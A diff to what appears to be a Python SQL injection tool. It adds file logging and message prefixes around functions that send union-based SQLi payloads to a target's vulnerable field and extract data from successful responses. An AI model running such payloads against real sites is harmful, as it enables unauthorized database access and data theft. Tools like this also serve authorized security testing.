@@ -1,6 +1,7 @@
 import requests
 from colorama import Fore, Style
 from extract_data import extract_data
+from utils import write_to_file
 
 
 def check_response(response, payload):
@@ -75,6 +76,10 @@ def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, 
     Test SQLi payloads with a known number of columns
     """
     print(f"{Fore.LIGHTBLUE_EX}[*] Testing exploitation payloads...{Style.RESET_ALL}")
+    write_to_file(
+        file,
+        f"[*] Running Union-Based SQL Injection..."
+    )
     payloads = [
             "USER()",
             "USER()", "NULL()",
@@ -94,10 +99,10 @@ def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, 
         payload = generate_payload(base_payload, columns)
         response = send_payload(url, http_method, data, vulnerable_field, payload)
         if check_response(response, payload):
-            print(f"{Fore.LIGHTGREEN_EX}Payload success: {payload}{Style.RESET_ALL}")
+            print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
             extract_data(response, file, payload, vulnerable_field)
         else:
-            print(f"{Fore.RED}Failed to send payload: {payload}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")
 
 
 def test_mysql(url, http_method, data, vulnerable_field, file):
@@ -105,5 +110,9 @@ def test_mysql(url, http_method, data, vulnerable_field, file):
     Wrapper function to test MySQL vulnerabilities
     """
     print(f"{Fore.BLUE}[*] Testing MySQL vulnerabilities...{Style.RESET_ALL}")
+    write_to_file(
+        file,
+        f"[*] Testing MySQL vulnerabilities..."
+    )
     columns = test_union_column_count(url, http_method, data, vulnerable_field)
     exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file)
